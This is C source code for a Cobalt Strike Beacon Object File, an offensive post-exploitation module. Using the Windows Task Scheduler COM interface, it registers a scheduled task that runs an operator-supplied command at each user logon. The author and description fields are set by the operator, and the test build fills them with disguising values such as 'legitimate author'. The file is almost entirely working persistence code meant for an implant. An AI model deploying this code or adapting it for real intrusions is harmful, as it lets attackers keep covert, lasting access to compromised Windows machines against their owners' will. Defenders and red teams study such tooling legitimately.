#include <windows.h>
#include <stdio.h>
#include <taskschd.h>
#include "bofdefs.h"


#pragma comment (lib, "taskschd.lib");
#define UNLEN 256



#pragma region error_handling
#define print_error(msg, hr) _print_error(__FUNCTION__, __LINE__, msg, hr)
BOOL _print_error(char* func, int line,  char* msg, HRESULT hr) {
#ifdef BOF
	BeaconPrintf(CALLBACK_ERROR, "(%s at %d): %s 0x%08lx", func, line,  msg, hr);
#else
	printf("[-] (%s at %d): %s 0x%08lx", func, line, msg, hr);
#endif // BOF

	return FALSE;
}
#pragma endregion



BOOL com_init() {
	HRESULT hr;

	hr = CoInitializeEx(NULL, COINIT_MULTITHREADED);
	if (FAILED(hr))
		return print_error("CoInitializeEx", hr);

	return TRUE;
}


BSTR user_get_username() {
	
	DWORD max_len = UNLEN + 1;
	WCHAR username[UNLEN + 1];
	if (!GetUserNameW(username, &max_len)) {
		print_error("GetUserNameW", GetLastError());
		return NULL;
	}

	return SysAllocString(username);
}

BOOL task_create(BSTR task_name, BSTR author, BSTR description, BSTR exec_path, BSTR exec_args) {

	HRESULT hr;
	CLSID TaskScheduler_CLSID;

	IID ILogonTrigger_IID, IExecAction_IID, ITaskService_IID;

	ITaskService* pService = NULL;
	ITaskFolder* pRootFolder = NULL;
	ITaskDefinition* pTask = NULL;
	IRegistrationInfo* pRegInfo = NULL;
	ITaskSettings* pSettings = NULL;
	ITriggerCollection* pTriggerCollection = NULL;
	ITrigger* pTrigger = NULL;
	ILogonTrigger* pLogonTrigger;
	IActionCollection* pActionCollection = NULL;
	IAction* pAction = NULL;
	IExecAction* pExecAction = NULL;
	IRegisteredTask* pRegisteredTask = NULL;


	/* string IIDs */
	wchar_t* szITaskService = L"{2faba4c7-4da9-4013-9697-20cc3fd40f85}";
	wchar_t* szILogonTrigger = L"{72DADE38-FAE4-4b3e-BAF4-5D009AF02B1C}";
	wchar_t* szCLSID_TaskScheduler = L"{0f87369f-a4e5-4cfc-bd3e-73e6154572dd}";
	wchar_t* szIExecAction = L"{4c3d624d-fd6b-49a3-b9b7-09cb3cd3f047}";


	/*  */
	hr = CLSIDFromString(szCLSID_TaskScheduler, &TaskScheduler_CLSID);
	if (FAILED(hr))
	{
		return print_error("CLSIDFromString szCLSID_TaskScheduler", hr);
	}

	IIDFromString(szITaskService, &ITaskService_IID);
	IIDFromString(szILogonTrigger, &ILogonTrigger_IID);
	IIDFromString(szIExecAction, &IExecAction_IID);



	//VARIANT vEmpty = {vEmpty.vt = VT_I4, vEmpty.bVal = 0};
	VARIANT vEmptyString = { vEmptyString.vt = VT_EMPTY};

	hr = CoCreateInstance(TaskScheduler_CLSID, NULL, CLSCTX_INPROC_SERVER, ITaskService_IID, (LPVOID*)&pService);
	if (FAILED(hr))
		return print_error("CoCreateInstance", hr);

	hr = pService->Connect(vEmptyString, vEmptyString, vEmptyString, vEmptyString);
	if (FAILED(hr)) {
		pService->Release();
		return print_error("pService->Connect", hr);
	}

	hr = pService->GetFolder(L"\\", &pRootFolder);
	if (FAILED(hr)) {
		pService->Release();
		return print_error("pService->GetFolder", hr);
	}


	hr = pService->NewTask(0, &pTask);
	pService->Release(); /* not needed anymore */

	if (FAILED(hr)) {
		pRootFolder->Release();
		return print_error("pService->NewTask", hr);
	}


	hr = pTask->get_RegistrationInfo(&pRegInfo);
	if (FAILED(hr)) {
		pRootFolder->Release();
		pTask->Release();
		return print_error("pTask->get_RegistrationInfo", hr);
	}


	hr = pRegInfo->put_Author(author);
	if (FAILED(hr)) {
		pRootFolder->Release();
		pTask->Release();
		return print_error("pRegInfo->put_Author", hr);
	}


	hr = pRegInfo->put_Description(description);
	if (FAILED(hr)) {
		pRootFolder->Release();
		pTask->Release();
		return print_error("pRegInfo->put_Description", hr);
	}

	hr = pTask->get_Settings(&pSettings);
	if (FAILED(hr)) {
		pRootFolder->Release();
		pTask->Release();
		return print_error("pTask->get_Settings", hr);
	}

	hr = pSettings->put_StartWhenAvailable(VARIANT_TRUE);
	pSettings->Release();
	if (FAILED(hr)) {
		pRootFolder->Release();
		pTask->Release();
		return print_error("pSettings->put_StartWhenAvailable", hr);
	}


	hr = pTask->get_Triggers(&pTriggerCollection);
	if (FAILED(hr)) {
		pRootFolder->Release();
		pTask->Release();
		return print_error("pTask->get_Triggers", hr);
	}


	hr = pTriggerCollection->Create(TASK_TRIGGER_LOGON, &pTrigger);
	pTriggerCollection->Release();
	if (FAILED(hr)) {
		pRootFolder->Release();
		pTask->Release();
		return print_error("pTriggerCollection->Create", hr);
	}


	hr = pTrigger->QueryInterface(ILogonTrigger_IID, (LPVOID*)&pLogonTrigger);
	pTrigger->Release();
	if (FAILED(hr)) {
		pRootFolder->Release();
		pTask->Release();
		return print_error("pTrigger->QueryInterface", hr);
	}

	hr = pLogonTrigger->put_Id(L"Trigger 1");
	if (FAILED(hr)) { /* msdn didn't return on failure */
		print_error("pLogonTrigger->put_Id", hr);
	}

	hr = pLogonTrigger->put_UserId(user_get_username());
	if (FAILED(hr)) {
		pRootFolder->Release();
		pTask->Release();
		return print_error("pTrigger->QueryInterface", hr);
	}


	hr = pTask->get_Actions(&pActionCollection);
	if (FAILED(hr)) {
		pRootFolder->Release();
		pTask->Release();
		return print_error("pTask->get_Actions", hr);
	}

	hr = pActionCollection->Create(TASK_ACTION_EXEC, &pAction);
	pActionCollection->Release();
	if (FAILED(hr)) {
		pRootFolder->Release();
		pTask->Release();
		return print_error("pActionCollection->Create", hr);
	}


	pAction->QueryInterface(IExecAction_IID, (LPVOID*)&pExecAction);
	pAction->Release();
	if (FAILED(hr)) {
		pRootFolder->Release();
		pTask->Release();
		return print_error("pAction->QueryInterface", hr);
	}


	hr = pExecAction->put_Path(exec_path);
	if (FAILED(hr)) {
		pRootFolder->Release();
		pTask->Release();
		return print_error("pExecAction->put_Path", hr);
	}

	hr = pExecAction->put_Arguments(exec_args);
	if (FAILED(hr)) {
		pRootFolder->Release();
		pTask->Release();
		return print_error("pExecAction->put_Arguments", hr);
	}

	
	hr = pRootFolder->RegisterTaskDefinition(task_name, pTask,
		TASK_CREATE_OR_UPDATE,
		vEmptyString, vEmptyString,
		TASK_LOGON_INTERACTIVE_TOKEN,
		vEmptyString,
		&pRegisteredTask
	);
	if (FAILED(hr)) {
		pRootFolder->Release();
		pTask->Release();
		return print_error("pRootFolder->RegisterTaskDefinition", hr);
	}



	pRootFolder->Release();
	pTask->Release();
	pRegisteredTask->Release();
	
	return TRUE;
}



#ifdef BOF
void go(char* buff, int len) {
	datap parser;

	wchar_t* task_name,
		* author,
		* description,
		* command,
		* args;


	BeaconDataParse(&parser, buff, len);

	task_name = (wchar_t*)BeaconDataExtract(&parser, 0);
	author = (wchar_t*)BeaconDataExtract(&parser, 0);
	description = (wchar_t*)BeaconDataExtract(&parser, 0);
	command = (wchar_t*)BeaconDataExtract(&parser, 0);
	args = (wchar_t*)BeaconDataExtract(&parser, 0);

	if (!com_init())
		return;

	if (!task_create(task_name, author, description, command, args))
		return;

	CoUninitialize();
}


#else

void main(int argc, char* argv[]) {

	if (!com_init())
		return;

	if (!task_create(SysAllocString(L"test_task"), SysAllocString(L"legitimate author"), SysAllocString(L"Legitimate desc"), SysAllocString(L"C:\\windows\\system32\\cmd.exe"), SysAllocString(L"/C notepad.exe")))
		return;

	CoUninitialize();
}

#endif